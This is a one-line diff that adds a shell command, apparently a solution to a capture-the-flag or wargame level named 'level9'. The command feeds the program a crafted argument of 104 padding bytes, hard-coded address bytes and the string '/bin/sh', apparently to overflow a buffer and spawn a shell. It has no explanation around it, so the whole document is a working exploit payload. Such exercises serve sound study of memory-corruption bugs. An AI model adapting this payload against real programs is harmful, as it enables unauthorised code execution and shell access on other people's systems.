@@ -1,0 +1,1 @@
+./level9 "$(python -c "print 'a' * 104 + '\x60\x60\xd8\xb7\x74\xa0\x04\x08 ; /bin/sh'")"
